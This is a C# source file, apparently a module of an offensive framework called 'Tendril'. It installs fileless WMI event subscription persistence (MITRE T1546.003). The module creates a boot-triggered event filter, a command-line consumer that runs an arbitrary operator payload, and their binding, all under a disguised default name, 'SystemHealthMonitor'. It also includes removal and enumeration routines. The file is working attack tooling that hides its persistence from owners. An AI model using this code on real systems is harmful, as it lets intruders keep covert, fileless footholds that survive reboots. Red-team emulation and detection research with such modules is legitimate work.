using System;
using System.Collections.Generic;
using System.Management;
using Tendril.Core;

namespace Tendril.Modules
{
    /// <summary>
    /// WMI Event Subscription Persistence (T1546.003)
    ///
    /// Creates a permanent WMI event subscription that triggers a command on
    /// system startup (or custom WQL filter). Persistence lives entirely in the
    /// WMI repository (OBJECTS.DATA) - no files on disk, no registry keys, no
    /// services. Detection requires Sysmon events 19/20/21 or WMI repository
    /// inspection.
    ///
    /// Observed: APT29, APT3 (2024-2025), Qilin ransomware, CISA Gunra advisory (2026).
    /// Admin required for CommandLineEventConsumer; ActiveScriptEventConsumer
    /// may work at user level depending on WMI provider configuration.
    /// </summary>
    public class WmiSubscription : ITendril
    {
        public string Name { get { return "WmiSubscription"; } }
        public string Description { get { return "WMI event subscription - fileless persistence in WMI repository"; } }
        public string MitreId { get { return "T1546.003"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string WmiNamespace = @"root\subscription";

        // Default WQL: fires ~60s after every boot
        private const string DefaultFilter =
            "SELECT * FROM __InstanceModificationEvent WITHIN 60 " +
            "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
            "AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string filterName, consumerName, payload, wql;

            if (!options.TryGetValue("name", out filterName))
                filterName = "SystemHealthMonitor";
            consumerName = filterName + "Consumer";

            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<command_line>");

            if (!options.TryGetValue("wql", out wql))
                wql = DefaultFilter;

            try
            {
                // 1. Create __EventFilter
                var filterClass = new ManagementClass(
                    new ManagementScope(WmiNamespace), 
                    new ManagementPath("__EventFilter"), null);
                var filterInstance = filterClass.CreateInstance();
                filterInstance["Name"] = filterName;
                filterInstance["EventNamespace"] = @"root\cimv2";
                filterInstance["QueryLanguage"] = "WQL";
                filterInstance["Query"] = wql;
                filterInstance.Put();

                // 2. Create CommandLineEventConsumer
                var consumerClass = new ManagementClass(
                    new ManagementScope(WmiNamespace),
                    new ManagementPath("CommandLineEventConsumer"), null);
                var consumerInstance = consumerClass.CreateInstance();
                consumerInstance["Name"] = consumerName;
                consumerInstance["CommandLineTemplate"] = payload;
                consumerInstance.Put();

                // 3. Create __FilterToConsumerBinding
                var bindingClass = new ManagementClass(
                    new ManagementScope(WmiNamespace),
                    new ManagementPath("__FilterToConsumerBinding"), null);
                var bindingInstance = bindingClass.CreateInstance();
                bindingInstance["Filter"] = filterInstance.Path.Path;
                bindingInstance["Consumer"] = consumerInstance.Path.Path;
                bindingInstance.Put();

                return new TendrilResult(ResultStatus.Success, Name,
                    "WMI event subscription installed")
                    .WithMeta("FilterName", filterName)
                    .WithMeta("ConsumerName", consumerName)
                    .WithMeta("Payload", payload)
                    .WithMeta("WQL", wql);
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name,
                    "WMI subscription creation failed: " + ex.Message);
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string filterName;
            if (!options.TryGetValue("name", out filterName))
                filterName = "SystemHealthMonitor";
            string consumerName = filterName + "Consumer";

            try
            {
                var scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                // Remove binding first
                DeleteWmiObject(scope, "__FilterToConsumerBinding",
                    string.Format("Filter=\"__EventFilter.Name='{0}'\"", filterName));

                // Remove consumer
                DeleteWmiObject(scope, "CommandLineEventConsumer",
                    string.Format("Name='{0}'", consumerName));

                // Remove filter
                DeleteWmiObject(scope, "__EventFilter",
                    string.Format("Name='{0}'", filterName));

                return new TendrilResult(ResultStatus.Success, Name,
                    "WMI event subscription removed")
                    .WithMeta("FilterName", filterName);
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name,
                    "WMI subscription removal failed: " + ex.Message);
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            try
            {
                var scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                // Enumerate all event filters
                var filterQuery = new ObjectQuery("SELECT * FROM __EventFilter");
                using (var searcher = new ManagementObjectSearcher(scope, filterQuery))
                {
                    foreach (ManagementObject filter in searcher.Get())
                    {
                        string name = filter["Name"] != null ? filter["Name"].ToString() : "<unnamed>";
                        string query = filter["Query"] != null ? filter["Query"].ToString() : "";

                        // Find associated consumer via binding
                        string consumerInfo = FindBoundConsumer(scope, name);

                        results.Add(new TendrilResult(ResultStatus.Info, Name,
                            string.Format("WMI EventFilter: {0}", name))
                            .WithMeta("WQL", query)
                            .WithMeta("Consumer", consumerInfo));
                    }
                }
            }
            catch (Exception ex)
            {
                results.Add(new TendrilResult(ResultStatus.Warning, Name,
                    "Failed to enumerate WMI subscriptions: " + ex.Message));
            }

            return results;
        }

        private static void DeleteWmiObject(ManagementScope scope, string className, string condition)
        {
            try
            {
                string queryStr = string.Format("SELECT * FROM {0} WHERE {1}", className, condition);
                using (var searcher = new ManagementObjectSearcher(scope, new ObjectQuery(queryStr)))
                {
                    foreach (ManagementObject obj in searcher.Get())
                        obj.Delete();
                }
            }
            catch { /* object may not exist - acceptable */ }
        }

        private static string FindBoundConsumer(ManagementScope scope, string filterName)
        {
            try
            {
                var query = new ObjectQuery(
                    "SELECT * FROM __FilterToConsumerBinding WHERE " +
                    "Filter = \"__EventFilter.Name='" + filterName + "'\"");
                using (var searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject binding in searcher.Get())
                    {
                        return binding["Consumer"] != null ? binding["Consumer"].ToString() : "unknown";
                    }
                }
            }
            catch { }
            return "no binding found";
        }
    }
}
